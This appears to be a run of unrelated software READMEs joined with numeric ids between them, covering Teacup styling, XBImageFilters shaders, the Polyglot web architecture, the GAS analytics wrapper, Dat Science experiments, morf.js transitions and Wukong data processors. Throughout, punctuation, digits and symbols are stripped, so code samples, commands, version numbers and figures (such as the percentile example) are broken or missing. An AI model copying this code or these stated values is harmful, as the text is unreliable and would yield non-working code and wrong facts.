boldsystemfontofsize   textcolor uicolor whitecolor this style should add a portrait setting that restores the font and color style label extends genericlabel font uifont systemfontofsize   this will override all the font settings advanced teacup tricks  there are times when you might wish teacup just worked  but please remember teacup is not a blessed framework built by apple engineers we have access to the same apis that you do that said here are some use cases where you can most definitely use teacup but you ll need to do a little more leg work not autolayout it s been mentioned a few times in this document that teacup will create style views in the viewdidload method that means that the superview property of the controller s view will necessarily not be set yet viewdidload is called after the view is instantiated in loadview  and it hasn t been added as a subview yet auto layout is based on the relationship between two views often a container and child view it s an amazing system but if that parent view isn t available  well you re not gonna have much success in the case of a uiviewcontroller your container is the self view property which by default has sensible springs setup so that it stretches to fill the superview it s not until you go messing with the self view property or are not in the context of a uiviewcontroller that things get hairy if this is the case you should get some pretty obvious warning messages something along the lines of could not find superview i don t know about you but i often write helper classes for tableviews that appear on many screens in an app you should not shy away from adding teacup s layout module to these helper classes if you are using your controller as your table view datasource the subview and layout methods continue to work as you expect them to this is for the case when you are using a helper class as the datasource and and or delegate class tablehelper include teacup tableviewdelegate include teacup layout stylesheet tablehelper def tableview tableview cellforrowatindexpath indexpath cellidentifier mycontroller cell cell tableview

uiimageview image end cell contentview and all child classes will inherit the tablehelper stylesheet return cell all styles can accept a proc and before the style is applied the proc is called and you can calculate a value at runtime there are times when this is simply convenient and there are times when it is necessary convenient when a value is based on some other view s value style someview backgroundcolor view view backgroundcolor view superview someothercolor required when you need to instantiate an object like a view style someview there s no only run once idiom in teacup so we need to make sure not to create this view every time someview is restyled leftview view view leftview and and uilabel alloc initwithframe sugarcube and teacup sweettea sugarcube was born of a desire to make teacup stylesheets more readable less cluttered with apple s verbose method names and constants sweettea takes this a step further by implementing a wealth of teacup handlers that translate symbols to constants and provide useful shorthands style button normal image button white  highlighted image button white pressed  title submit  shadow opacity   radius  offset    color black font comic sans style label font bold alignment center color slateblue sweettea also offers some convenient styles that you can extend in your base class you might want to either specify the sweettea version you are using in your gemfile or copy the stylesheet so that changes to sweettea don t affect your project once that projet is at   you can rely on the styles not changing style submitbutton extends whitebutton style header extends label style logininput extends emailinput style passwordinput extends secureinput misc notes  multiple calls to style with the same stylename combines styles it doesn t replace the styles styles are not necessarily applied immediately they are applied at the end of the outermost layout and subview method including the uiviewcontroller layout block if you call stylename or stylesheet outside a layout and subview block your view will be restyled immediately restyling a view calls restyle on all child views all the way down the tree much care has been taken to call this method sparingly within teacup any styles that you apply in a layout and subview method are not retained they are applied immediately and so the stylesheet can and usually do override those styles if there is a conflict only styles stored in a stylesheet are reapplied during rotation or in restyle stylesheets should not be modified once they are created they cache styles by name it is a per orientation cache you can add and remove a styleclass using addstyleclass and removestyleclass  which will call restyle for you if styleclasses array was changed if you need to do frame calculations outside of the stylesheet code you should do so in the layoutdidload method this is not necessary though it is usually cleaner to do the frame calculations in stylesheets either using geomotion  frame calculations or auto layout within a subview and layout block views are added to the last object in layout superviewchain views are pushed and popped from this array in the layout layout method starting with the toplevelview if you include teacup layout on your own class you do not have to implement toplevelview unless you want to use the subview method to add classes to a default target when uiview goes looking for its stylesheet it does so by going up the responder chain that means that if you define the stylesheet on a parent view or controller all the child views will use that same stylesheet by default it also means you can assign a stylesheet to a child view without worrying what the parent view s stylesheet is caveat if you implement a class that includes teacup layout  you can assign it a stylesheet that stylesheet will be used by views created using layout or subview even though your class is probably not part of the responder chain saying that uiview inherits its stylesheet from the responder chain is not accurate it actually uses teacupresponder  which defaults to nextresponder  but it is assigned to whatever object calls the layout method on the view if you use teacup appearance but it is not styling the first screen of your app but strangely does style all other screens  try calling teacup appearance apply before creating you create the rootviewcontroller in your appdelegate the dummy  if you get an error that looks like this objective c stub for message sethideswhenstopped type v c not precompiled make sure you properly link with the framework or library that defines this message you probably need to add your method to dummy rb this is a compiler issue nothing we can do about it except build up a huge dummy rb file that has just about every method that you would want to style there is a dummy rb file for ios  and one for os x dummy rb osx if you need to add this method to your project please give back to the community by forking teacup and adding this method to the dummy rb file it s easy create a subclass define a method called dummy  and call the not precompiled message inside it that will trigger the compiler to include this method signature for instance lets say you are styling a uipickerview and you get the error objective c stub for message setshowsselectionindicator type you would open up dummy rb and add the following code class dummypickerview uipickerview def dummy setshowsselectionindicator nil recompile your project and you should be good to go teacup was born out of the

3446222, xbimagefilters allows you to obtain filtered versions of any image or from the camera in realtime it uses opengl es  to filter the images through fragment shaders you write yourself so you can filter your images in whatever way you want and it is super fast in this screenshot of the sample we have on the top half of the screen a regular uiimageview with contentmode set to uiviewcontentmodetop and on the bottom half a xbfilteredimageview with the same image with contentmode set to uiviewcontentmodebottom and a filter a glsl fragment shader that outputs the luminance of the pixel color convoluted gaussian blur an example of a multi pass filter it uses two fragment shaders for this vgaussianblur glsl hgaussianblur glsl first it uses vgaussianblur to perform a vertical blur and the resulting image is stored in an opengl texture then it uses hgaussianblur to apply a horizontal blur in the previous texture that it rendered into as a result we have a proper gaussian blur with a radial kernel real time camera filter it also allows you to take pictures in uiimage s with the filter applied with the xbfilteredview takescreenshot method you can also take high resolution photos with filters isn t that awesome a few frameworks must be added to your project in order to link xbimagefilters successfully quartzcore coremedia corevideo opengles avfoundation the xbfilteredimageview is a view backed by an opengl layer which displays an image after applying a custom shader on it to use it create a xbfilteredimageview instance and set its image and one or more filters and add it as subview have a look in the imageviewcontroller m to see a complete example objective c xbfilteredimageview filteredimageview xbfilteredimageview alloc initwithframe cgrectmake

create a xbfilteredimageview in interface builder just create an uiview set its class to xbfilteredimageview and connect to an iboutlet then in a view controller you can set up its shaders in viewdidload the xbfilteredcameraview is a view backed by an opengl layer which displays the image from one of the cameras after applying a custom shader on it in real time to use it create a xbfilteredcameraview instance set its filters add as subview and call xbfilteredcameraview startcapturing you can find a complete example in cameraviewcontroller m objective c xbfilteredcameraview

filteredcameraview filteredcameraview startcapturing while capturing you can grab a photo through the takeaphotowithcompletion  which gives you a high resolution uiimage with the filter applied in the completion block you can also create xbfilteredcameraviews in interface builder as well to write your own shaders you should have a good grasp of the opengl architecture and especially the glsl language and how shaders work in short a fragment shader is a piece of code that runs in the gpu for each pixel and returns the final color for that pixel you can have access to the value of some variables you define yourself in the shader you can declare a uniform variable constant for all pixels and provide a value for it from your code that runs on the cpu and then use that value to compute the final color of the pixel using uniforms you can control things in your filter like blur radius montion blur direction etc being a bit pedantic the fragment shader is not actually ran for each pixel there might be more than a single sampling point in each pixel on the screen and the fragment shader is ran for each of these sampling points so if we have  sampling points the fragment shader will be run  times per pixel but in what situation would a pixel have more than one sampling point when we re using multisampling anti aliasing in order to keep the edges smooth multisampling samples several points in different locations inside each pixel and averages the sampled values to obtain the final pixel color in a step that is usually known as resolving the multisample framebuffer xbimagefilters use the class glkprogram to store shader information these programs are available in the programs nsarray property of the xbfilteredview and its subclasses of course the setvalue foruniformnamed method allows you to change the value of a uniform in your shader you need to know its name the variable name in the shader and you have to provide the value in a buffer of the same size as the uniform type size the data is copied and the memory is managed internally the simplest possible fragment shader is the one which outputs the original color of the input image precision mediump float uniform samplerd stexture varying vec vtexcoord void main glfragcolor textured stexture vtexcoord the statement precision mediump float is required and it specifies the precision of the floating point values the uniform samplerd stexture is used to sample colors from a texture in a specific location texture coordinate it is either the image in the xbfilteredimageview or the image of the camera in the xbfilteredcameraview your main texture sampler must be named stexture the varying vec vtexcoord is the texture coordinate at the current fragment it is automatically interpolated throughout the triangle which is being rendered and rasterized void main starts the definition of the main function that will be run in the gpu for each fragment it s here that we do all the crazy math necessary in the end of it we have to assign a value to the glfragcolor variable which determines the final color for the current fragment in this case we re just assigning the color of the main texture at the texture coordinate vtexcoord which will map the original image straight on the screen and view the textured function performs the texture sampling it takes the sampler in the first argument which determines how the texture should be sampled minification filter magnification filter wrapping modes etc  and the second argument is the texture coordinate in normalized space it goes from  to  in both dimensions where horizontally  is the left and  is the right of the texture and vertically  is the bottom and  is the top of the texture xbimagefilters uses opengl to draw textured planes applying any custom opengl es  fragment shader on it which gives a lot of freedom on what can be done since we have to write the algorithm that computes the final color for each pixel it simply builds a rectangle with  triangles and applies the image or data supplied as a texture on this rectangle then it sets some custom transforms on this rectangle that you can provide sets the custom fragment shader and draws the result to the screen whenever you want to you can change some parameter and uniform like the radius of the blur in a blur filter and redraw in the core of xbimagefilters in the xbfilteredview a subclass of uiview that encapsulates all of the opengl stuff in it it creates the glkview yes this project uses glkit  setups textures additional framebuffers and textures for multi pass filters that perform some render to texture rtt steps the single and simple vertex buffer the transforms for the content the shaders the drawing code and more this class is not intended to be used directly it might be conceptually considered an abstract class if you think of something else that can be filtered you can implement a subclass of xbfilteredview and provide content through its protected methods settexturedata width height and updatetexturewithdata the concrete filter classes at this moment are xbfilteredimageview and xbfilteredcameraview only the xbfilteredimageview is a subclass of xbimagefilters that has an image property you can set an image to it and then set a filter shader with the method setfilterfragmentshaderfromfile error or multiple filters with setfilterfragmentshadersfromfiles error  then the view will be automatically redrawn the xbfilteredcameraview is a subclass of xbimagefilters that allows you to filter the input image of a camera in real time it uses avfoundation to capture the camera image you can instantiate it set some filters and call startcapturing to start the real time rendering you can also take a photo as an uiimage with the method takeaphotowithcompletion this project is under the mit license details in copyright txt do whatever you want with it and contributions of any form are very welcome

21591788, polyglot is experimental and incomplete at the moment please use with caution and at your own risk  polyglot allows programmers to collaborate and develop a single web app using multiple programming languages libraries environments and even different versions of the same language what does this mean this also means you can scale and evolve your web app building on what you have built before and taking down only those parts that you need to replace and even replace your web app in a less destructive way no more big bang approach to upgrading your web platform so what s the catch polyglot increases the complexity in the effort to develop web apps unlike frameworks like rails or django or express polyglot doesn t exist to make life easier for the programmer in fact it adds the complexity of the application not only in the deployment but also in the development as a programmer you trade complexity and effort for something you think is more important for the web app you re creating in polyglot we are trading complexity and effort for  performance scalability polyglot responders are distributed and independent processes that can reside anywhere on a connected network  extensibility by creating an acceptor as a controller in an existing web app you can extend the applications through polyglot  multi lingual independent development polyglot responders can be developed independently in different programming languages libraries and environments polyglot is not for all web apps you should only use polyglot for web apps that need to be scaled in a highly performant way and and or need to be incrementally developed in multiple programming languages for example if your web app never needs to scale beyond a single server you re probably better off using some other single language framework and if once your web app is created you or anyone else never need to add new features polyglot is probably not suitable either why would you want to develop a web app in multiple programming languages there are good practical reasons  web apps you write are systems and they change over time and can be written or maintained by different groups of people if you re not restricted to a particular platform or language then the chances of getting an incrementally better piece of software is higher  you can switch out the poor performing responders and replace them with higher performing ones different responders can have different criteria for performance ease of development ease of maintenance or quick turnaround in development with a single programming language you are often forced to accept a compromise with multiple programming languages you can choose the platform and language as what you need for that particular responder  different responders can be written for specific performance gains or maintainability why is even a web framework web frameworks make life easier for programmers by making it easier to create web apps while the added complexity of writing web apps with polyglot make things more difficult initially over time the application is easier to extend and to evolve with a bigger picture in mind polyglot does make life easier for programmers polyglot has a very simple and basic architecture it consists of  main components  acceptor the acceptor is a http interface that takes in a http request and provides a http response the acceptor takes in a http request converts it into messages and sends it to the polyglot broker then depending on what is asked it will return the appropriate http response the default implementation of the acceptor is in go to extend an existing web app you can also optionally implement the acceptor as a controller in that web app  broker the broker is an intermediary that receives the messages that represent the http request and forwards it to the corresponding responder  responder responders are standalone processes written in any language that receives messages from the broker and responds to it accordingly in most web frameworks this is usually called the controller however unlike most web framework controllers the responders are actual independent processes that can potentially sit in any connected remote server responders contain the business logic of your code architecture docimages and architecture jpg polyglot architecture essentially the polyglot architecture revolves around using a broker to disassociate the processing units responders from the communications unit acceptor  allowing the responders to be created in multiple languages  client sents a http request to the acceptor  the acceptor converts the request into json and sends it to the broker and waits for a response  the broker routes the message to the correct responder  the responder processes the request message  the responder sends the response back to the broker the response message is an array that has  elements the route id the http status code a map of headers and a body  the broker receives the response and uses the route id to respond to the correct acceptor  the acceptor uses the http status code response headers and the body creates a http response and sends it to the client the acceptor is a communications unit that interacts with the external world normally a browser but can also be another server calling an api the default implementation is written in go the acceptor is sessionless and its main task is to accept requests and sends them to the broker then receives the response and reply to the requestor the communications with the broker is through zmq you can also extend an existing application by creating a controller in that application as an acceptor there can be one or more acceptors in a single polyglot application for load balancing purposes the broker is a load balancing broker implemented in go and communicates with both the acceptors and the responders through zmq the broker queues responders that are registered with it and load balances amongst them using round robin responders are processing units that can be written in any programming language that can communicate with the broker through zmq responders are normally written as standalone processes all responders essentially do the same thing which is to process incoming requests and returns a message to the broker each responder must have a route id which is in the format of http method and  and url path for example get and  and hello and world is a route id each responder must also have a unique id that identifies itself across all routes it s the developer s responsibility to ensure the uniqueness of the id as the broker will not check its uniqueness my development environment in os x mavericks but it should work fine with most nix based environments the default polyglot acceptor is written in go to install just run go build this should create a program called polyglot to run the default acceptor and polyglot to configure the acceptor modify the config json file and restart the acceptor the acceptor also creates a log file called acceptor log that shows the acceptor s activities the polyglot broker is written in go to install go to the broker directory and run go build this should create a program called broker to run the broker and broker the broker creates a log file called broker log that shows the broker s activities there is a command line admin tool called polyadm in the polyadm directory to start the responders individually go to the respective directories for eg the ruby directory and do this ruby responder rb this will start up the hello ruby responder note that you have only started  responder to start up and manage a bunch of responders open up procfile in the responders directory helloruby ruby c and ruby responder rb hellogo and goresp and goresp you will notice that the file consists of lines of configuration that starts up the responders now open up the file foreman concurrency helloruby  hellogo  as you can see each line after concurrency is a responder the number configuration is the number of responders you want to start up in this case i m starting up  helloruby and hellogo responders each to start all the responders at once foreman start if you want to run this in the background without being cut off when you log out nohup foreman start foreman is used for development and testing purposes only if you want to run this in production use foreman to export out the configuration files in upstart or launchd etc foreman should not be used in production writing responders are quite easy there are basically only a few steps to follow  connect to broker using whichever zmq library the language has  set the identity of the responder remember that it must be unique across all responders  establish the route id this is basically the http method followed by and  and and then the route path for example if you want to set up a responder for a get request going to the route hello then set up the route id to be get and  and hello  send the route id to the broker to register the responder  in a loop first receive the request and process it  then respond to the broker with an array of  elements each element must be a string  the route id  the http response status for example if everything is fine this is  if you want to redirect this will be  if it s an error it should be a xx  a hash and map and dictionary of headers you should try to put in at least the content type header  the http response body this must be a string the examples below shows how this can be done in various languages the full list of responders are in the responders directory including sample hello world type responders for node js please send pull requests for sample responders in other languages this will create the file responder which you can run from command line as a binary int main void zctxt ctx zctxnew void responder zsocketnew ctx zmqreq char identity  uuidt uuid

requestretries  broker tcp and and localhost   static public you can extend an existing web app by creating a controller in your application that emulates whatever the acceptor does which is essentially to pack the http request into json and send it to the broker then wait for a response and pass it back to the calling client the broker has a command line administration tool named polyadm

pretty limited while it can do all of the above some normally expected capabilities of a web framework are not easily achieved yet  including but not limited to session management and authentication

3269194, gas is a wrapper around the google analytics tracking api from google it tries to add new functionality while keeping the same api gas is not an official google library and gas developers are not affiliated with google to install gas download the script from download page download and put it somewhere on your website also install the basic snippet on every page of your website be sure to change the account number ua and the correct gas js file location you can also use gas hosted on cdnjs the basic snippet looks like this script type text and javascript var gas gas and and gas push setaccount  ua yyyyyy y and and replace with your ga number gas push setdomainname  mydomain com and and replace with your domain gas push trackpageview gas push gastrackforms gas push gastrackoutboundlinks gas push gastrackmaxscroll gas push gastrackdownloads gas push gastrackvideo gas push gastrackaudio gas push gastrackyoutube  force true gas push gastrackvimeo  force true gas push gastrackmailto function var ga document createelement script ga id gas script ga setattribute data use dcjs  false and and change to true for dc js support ga type text and javascript ga async true ga src and and cdnjs cloudflare com and ajax and libs and gas and    and gas min js var s document getelementsbytagname script  s parentnode insertbefore ga s and script there s no need to include the ga js file gas will load that file for you that snippet will enable the common features of gas gas is based on gaq from google and as such supports all methods it supports so go check official documentation gajs for the ga tracker additionally gas support a couple more features gas push gastrackforms  opts form tracking will trigger events every time a user submits a form or changes a form field parameters string opts category the event category default value is form tracking gas push gastrackmaxscroll  opts fire events with the max scroll percentage value for every page the user views parameters string opts category the event category default value is maxscroll gas push gastrackoutboundlinks  opts this function will look for any outbound links on the current page and will trigger an event when the link is clicked it bounds to the mousedown javascript event parameters string opts category the event category default value is outbound gas push gastrackdownloads  opts gas will track the following extensions by default xlsxlsxdocdocxpptpptxpdftxtziprarzexewmamovaviwmvmpcsvtsv parameters string opts category the event category default value is download string opts extensions comma separated list of additional extensions to track javascript gas push gastrackdownloads  category file downloads  extensions torrentgzmpwav gas push gastrackmailto  opts tracks clicks on links with href mailto parameters string opts category the event category default value is mailto gas push gastrackvideo tracks html video element events play  pause and ended gas push gastrackaudio tracks html audio element events play  pause and ended gas push gastrackvimeo  opts you can track vimeo video events you must be using the iframe method of embedding videos the browser must support html postmessage that means it won t work on ie after you enable it the following events will be tracked play  pause and finish you should append to the video url the parameter api  the embedding code should look like this if you don t provide the api parameter than gas will force a reload on the iframe adding this parameter parameters string opts category the event category default value is vimeo video boolean opts force add required parameters to video src causing the video iframe to reload default value is true gas push gastrackyoutube  opts you can track youtube video events you must be using the iframe method of embedding videos the browser must support html postmessage that means it won t work on ie after you enable it the following events will be tracked play  pause  finish and error you should append to the video url the parameter enablejsapi  the embedding code should look like this if you don t provide the enablejsapi parameter than gas will force a reload on the iframe adding this parameter parameters string opts category the event category default value is youtube video boolean opts force add required parameters to video src causing the video iframe to reload default value is true array opts percentages percentages to track in addition to the default events javascript gas push gastrackyoutube  percentages     this will setup youtube video tracking so that events will be fired at      and  in addition to the other standard events play  pause  finish gas push gasmeta this function should be called before trackpageview it will look for custom variables as meta elements with name gacustomvar it will also look for metas with name gavpv to be used as virtual pagepaths for trackpageview note that gavpv will only be aplied when trackpageview is called with no parameters for metas to control customvars the parameters are the same as calling setcustomvar but they are delimeted by a caret gas push gasmetaecommerce will look for ecommerce transactions as meta elements the parameters are the same as calling the javascript functions but must be separated by a caret gas push gashtmlmarkup will enable html markup to define events and social hits it uses attributes for setting events and social actions for events the required attributes are x ga event categoy and x ga event action x ga event action play x ga event label video name x ga event value  x ga event noninteractive false for social actions the required attributes are x ga social network and x ga social action x ga social action pin it x ga social target and targeturltest aspx x ga social pagepath and basepagepath php gas changes the behaiour of some functions that are defined on the official documentation gajs to make it easier to implement some very common cases this feature help you implementing cross domain setups it will find and tag all links to other domains and mark them with the link or linkbypost function you just need to push all domain names with setdomainname and then call gasmultidomain javascript gas push setaccount  ua xxxxx  gas push setallowlinker  true gas push setdomainname  mysite com gas push setdomainname  myothersite com gas push gasmultidomain  click the above snippet can be used in either mysite com or myothersite com it will know the right one to use for each case and all other domains pushed to setdomainname will be used to discover links between the sites the nice side effect is that you can have the same snippet for both websites note that calling setdomainname multiple times is not supported by gaq gas respects the settings for setallowanchor that you set so if you set it to true all future calls to getlinkerurl  link and linkbypost used by gas will include the boolean true for the optuseanchor parameter javascript gas push setaccount  ua xxxxx  gas push setallowlinker  true gas push setallowanchor  true gas push setdomainname  mysite com gas push setdomainname  myothersite com gas push gasmultidomain  click easier handling of multi account setups you can fire an event to all accounts or just to one of the accounts you configured javascript gas push setaccount  ua xxxxx  gas push setaccount  ua xxxxx  gas push custom setaccount  ua xxxxx  and and this will be sent to all  accounts gas push trackpageview and and this pageview goes only to account ua xxxxx  gas push custom trackpageview gas support changing the page title javascript gas push trackpageview  page and mypage  title my page title hooks are a handy feature if you want to monitor or change values of a call to one of the function from gaq you can use it as a filter to lowercase values or to trigger events to another tool every time a pageview is fired you can assign multiple hooks javascript gas push addhook  trackpageview  function page console log page if page tolowercase page page tolowercase return page gas push trackpageview  and home aspx the above hook will print the pushed page to the browser console and will return the page lowercased so the actual value sent to ga is the lowercased page this may be helpful for sites in asp where lowercase and uppercase don t matter and will save you the work for creating a ga profile filter here s another handy hook for events event values must always be integer values the hook bellow will try to round floats or convert strings to integers when possible this should avoid a bad value from canceling the event javascript gas push addhook  trackevent  function catactlabval if typeof val string val parseint val  val math round val return cat act lab val you can also cancel a call returning false from a hook javascript gas push addhook  setvar  function val gas push setcustomvar   usertype  val  return false the above hook will intercept and cancel any call to the now deprecated setvar it will then trigger a call to setcustomvar with an equivalent value add the following snippet before your gas push trackpageview call read google s in page analytics and enhanced link attribution documentation ela for more information javascript gas push require  inpagelinkid  and and www google analytics com and plugins and ga and inpagelinkid js available in versions    and  you can include dc js instead of ga js through gas by changing the setattribute line of the default snippet to ga setattribute data use dcjs  true

8364973, a ruby library for carefully refactoring critical paths science isn t a feature flipper or an a and b testing tool it s a pattern that helps measure and validate large code changes without altering behavior let s pretend you re changing the way you handle permissions in a large web app tests can help guide your refactoring but you really want to compare the current and new behaviors live under load require dat and science class myapp widget def allows user experiment dat science experiment new widget permissions do and e and e control model checkuser user valid old way e candidate user can read model new way experiment run wrap a control block around the code s original behavior and wrap candidate around the new behavior experiment run will always return whatever the control block returns but it does a bunch of stuff behind the scenes decides whether or not to run candidate  runs candidate before control  of the time measures the duration of both behaviors compares the results of both behaviors swallows any exceptions raised by the candidate behavior and publishes all this information for tracking and reporting if you d like a bit less verbosity the dat science science helper instantiates an experiment and calls run require dat and science class myapp widget include dat science def allows user science widget permissions do and e and e control model checkuser user valid old way e candidate user can read model new way the examples above will run but they re not particularly helpful the candidate block runs every time and none of the results get published let s fix that by creating an app specific sublass of dat science experiment this makes it easy to add custom behavior for enabling and disabling and throttling experiments and publishing results require dat and science module myapp class experiment dat science experiment def enabled see ramping up experiments below def publish name payload see publishing results below after creating a subclass tell dat science to instantiate it any time the science helper is called dat science experiment myapp experiment by default the results of the candidate and control blocks are compared with use comparator to do something more fancy science loose comparison do and e and e control vmg e candidate vmg e comparator and a b and a downcase b downcase by default the candidate block of an experiment will run  of the time this is often a really bad idea when testing live experiment enabled can be overridden to run all candidates say  of the time def enabled rand   or even better use a feature flag library like flipper delegating the decision makes it easy to define different rules for each experiment and can help keep all your entropy concerns in one place def enabled myapp flipper name enabled by default the results of an experiment are discarded this isn t very useful experiment publish can be overridden to publish results via any instrumentation mechanism which makes it easy to graph durations or matches and mismatches and store results the only two events published by an experiment are match when the result of the control and candidate behaviors are the same and mismatch when they aren t def publish event payload myapp instrument science event  payload the published payload is a symbol keyed hash experiment widget permissions  first control candidate duration   exception nil value  control duration   exception nil value  experiment is the name of the experiment first is either candidate or control  depending on which block was run first during the experiment timestamp is the time when the experiment started the candidate and control hashes have the same keys duration is the execution in ms expressed as a float exception is a reference to any raised exception or nil value is the result of the block it s often useful to add more information to your results and experiment context makes it easy science widget permissions do and e and e context user user e control model checkuser user valid old way e candidate user can read model new way context takes a symbol keyed hash of additional information to publish and merges it with the default payload sometimes the things you re comparing can be huge and there s no good way to do science against something simpler use a cleaner to publish a simple version of a big nasty object graph science huge results do and e and e control oldandbusted hugeresultsfor query e candidate newhotness hugeresultsfor query e cleaner and result and result count the results of the control and candidate blocks will be run through the cleaner you could get the same behavior by calling count in the blocks but the cleaner makes it easier to keep things in sync the original control result is still returned once you ve started an experiment and published some results you ll want to analyze the mismatches from your experiment check out analysis toolkit to help you understand your experiment results be on a unixy box make sure a modern bundler is available script and test runs the unit tests all development dependencies will be installed automatically if they re not available dat science happens primarily on ruby    and    but science should be universal

1977044, morf js is a javascript work around for hardware accelerated css transitions with custom easing functions ever wanted to produce css transitions with more compelling effects than just linear  ease  ease out  ease in or cubic bezier well now you can morf requires the following a webkit browser capable of css animations morf uses keyframes animations under the hood shifty js    morf can be downloaded with or without shifty pre bundled note as of morf js v   shifty js has been replaced by mifty js in the pre bundled build mifty js is a special build of shifty optimised for use with morf js which allows us to reduce the morf filesize although other browser vendors have started to add css animations e g firefox  they do not yet have an alternative implementation for the webkitcssmatrix object which is used to calculate the interpolated matrix values using it is simple but does require that you trigger the transition from javascript to transition an element to a new state you would do the following and and get a reference to the element var elem document getelementbyid elem var trans morf transition elem and and new css state webkit transform translated px   rotate deg  background color ff duration ms  timingfunction bounce  callback function elem and and you can optionally add a callback option for when the animation completes thats it your element will then transition right px rotate deg change colour to red using the bounce easing function if you would like to invoke a function when the animation completes you can do so with the callback option or listen for the webkittransitionend event here is a list of parameters you can pass into the options object duration string required the length of time the transition is to take e g ms or s timingfunction string required the name of the timing function to use see available easing functions for more details callback function a function to execute once the transition has completed the element that the transition was applied to is passed back as an argument to the callback function increment float default   the frequency at which to produce css animation keyframes the default   produces keyframes at  intervals increasing this value may result in uneven animations debug boolean default false if set to true then morf js will console log the generated css optimise boolean default true the webkitcssmatrix s tostring function will output numbers with  decimal places that is you may end up with many   references in your outputted css by default morf will optimise this string if you wish to get the originally generated string you can by passing in false decimalplaces int default  this is the number of decimal places the optimised css string will be rounded to if optimise is false then this parameter has no effect you may also just want to use morf as a css animation generator in which case you can get the generated keyframes in css format using the css property so continuing the above example console log trans css you can then paste the keyframes code straight into your stylesheet and use it as normal without the need for javascript easeinquad

spring sinusoidal adding your own is easy an easing function has the following prototype and and pos is the percentage of the way through the transition     function pos var newpos somemaths pos return newpos once you ve written your function you just need to load it into shifty s available formulas here s how i the scripty functions are added function var scripty spring function pos return  math cos pos   math pi math exp pos  sinusoidal function pos return math cos pos math pi and  and   and and load the scripty functions for var t in scripty tweenable prototype formula t scripty t so you know how to use it but you want to know how it works well what morf actually does is create a css animation on the fly for the requested transition in other words at the time that morf transition is called all the necessary keyframes are generated to give the impression that a transition has taken place even though this is actually a css animation morf does its best to masquerade as a transition even throwing a webkittransitionend event when its finished in order to tween the d matrix i had to add some custom functions to the webkitcssmatrix object the process of accurately tweening between two matrix states requires that the matrixes themselves be first decomposed into their composite parts translate rotate scale etc once these composite parts are known its a matter of tweening between each part of each state and then rebuilding the composite matrix in order to get the decompose function working i also had to supplement the webkitcssmatrix object with some other helpful matrix functions and add a basic vector implementation this may be of use to others so feel free to repurpose the code for your own projects note the decompose function is fairly expensive so its only called once for the start and end state of each transition contribution is welcomed but to make it easier to accept a pull request here are some guidelines please make all changes into the source files found under js and src you can then use the build tool php script found at and build and build to create the concatenated and minified files
114885, wukong is a toolkit for rapid agile development of data applications at any scale the core concept in wukong is a processor wukong processors are simple ruby classes that do one thing and do it well this codebase implements processors and other core wukong classes and provides a way to run and combine processors on the command line wukong s larger theme is powerful black boxes beautiful glue the wukong ecosystem consists of other tools which run wukong processors in various topologies across a variety of different backends code written in wukong can be easily ported between environments and frameworks local command line scripts on your laptop instantly turn into powerful jobs running in hadoop here is a list of various other projects which you may also want to peruse when trying to understand the full wukong experience for a more holistic perspective also see the infochimps platform community edition fixme link to this which combines all the wukong tools together into a jetpack which fits comfortably over the shoulders of developers the fundamental unit of computation in wukong is the processor a processor is ruby class which subclasses wukong processor use the wukong processor method as sugar for this defines a process method which takes an input record does something and calls yield on the output here s a processor that reverses each of its input records wukong processor stringreverser do def process string yield string reverse you can run this processor on the command line using text files as input using the wu local tool that comes with wukong cat novel txt it was the best of times it was the worst of times cat novel txt and wu local stringreverser rb semit fo tsrow eht saw ti semit fo tseb eht saw ti the wu local program consumes one line at at time from stdin and calls your processor s process method with that line as a ruby string object each object you yield within your process method will be printed back out on stdout processors are intended to be combined so they can be stored in the same file like these two related processors wukong processor splitter do def process line line split each and token and yield token wukong processor normalizer do def process token stripped token downcase gsub and w and  yield stripped if stripped size  notice how the splitter yields multiple tokens for each of its input tokens and that the normalizer may sometimes never yield at all depending on its input processors are under no obligations by the framework to yield or return anything so they can easily act as filters or even sinks in data flows there are two processors in this file and neither shares a name with the basename of the file processors so wu local can t automatically choose a processor to run we can specify one explicitly with the run option cat novel txt and wu local processors rb run splitter we can combine the two processors together cat novel txt and wu local processors rb run splitter and wu local processors rb run normalizer processors can have options that can be set in ruby code from the command line a configuration file or a variety of other places this processor calculates percentiles from observations assuming a normal distribution given a particular mean and standard deviation it uses two fields  the mean or average of a distribution mean and its standard deviation stddev from this information it will measure the percentile of all input values wukong processor percentile do sqrthalf math sqrt   field mean float default   field stddev float default   def process value observation value tof zscore mean observation and stddev percentile  math erfc zscore sqrthalf yield observation percentile join t these fields have default values but you can overide them on the command line if you scored a  on an exam where the mean score was  points and the standard deviation of the scores was  points for example then you d be in the rd percentile echo  and wu local and tmp and percentile rb mean  stddev      if the exam were more difficult with a mean of  points and a standard deviation of  points you d be in the th percentile echo  and wu local and tmp and percentile rb mean  stddev      processors have a lifecycle that they execute when they are run within the context of a wukong runner like wu local or wu hadoop each lifecycle phase corresponds to a method of the processor that is setup called after the processor is initialized but before the first record is processed you cannot yield from this method process called once for each input record may yield once many or no times finalize called after the the last record has been processed but while the processor still has an opportunity to yield records stop called to signal to the processor that all work should stop open connections should be closed c you cannot yield from this method the above examples have already focused on the process method the setup and stop methods are often used together to handle external connections wukong processor geolocator do field host string default localhost attraccessor connection def setup self connection database connection new host def process record record addedvalue connection find some query def stop self connection close the finalize method is most useful when writing a reduce type operation that involves storing or aggregating information till some criterion is met it will always be called after the last record has been given to process but you can call it whenever you want to within your own code here s an example of using the finalize method to implement a simple counter that counts all the input records wukong processor counter do attraccessor count def setup self count  def process thing self count and  def finalize yield count it hinges on the fact that the last input record will be passed to process first and only then will finalize be called this allows the last input record to be counted and processed and aggregated and then the entire aggregate to be dealt with in finalize because of this emphasis on building and processing aggregates the finalize method is often useful within processors meant to run as reducers in a hadoop environment note finalize is not guaranteed to be called by in every possible environment as it depends on the chosen runner in a local or hadoop environment the notion of last record makes sense and so the corresponding runners will call finalize in an environment like storm where the concept of last record is not supposed to be meaningful the corresponding runner doesn t ever call it wu local and many similar tools deal with inputs and outputs as processors want to process objects as close to their domain as is possible a processor which decorates address book entries with twitter handles doesn t want to think of its inputs as strings but hashes or better yet persons wukong makes it easy to wrap a processor with other processors dedicated to handling the common tasks of parsing records into or out of formats like json and turning them into ruby model instances wukong can parse and emit common data formats like json and delimited formats like tsv or csv so that you don t pollute or tie down your own processors with protocol logic here s an example of a processor that wants to deal with hashes as wukong processor extractor do def process hsh yield hsh firstname given json data cat input json firstname john  lastname  smith firstname sally  lastname  johnson you can feed it directly to a processor cat input json and wu local from json extractor rb other processors really like arrays wukong processor summer do def process values yield values map tof inject and so you can feed them tsv data cat data tsv cat data tsv and wu local from tsv summer rb but you can just as easily use the same code with csv data cat 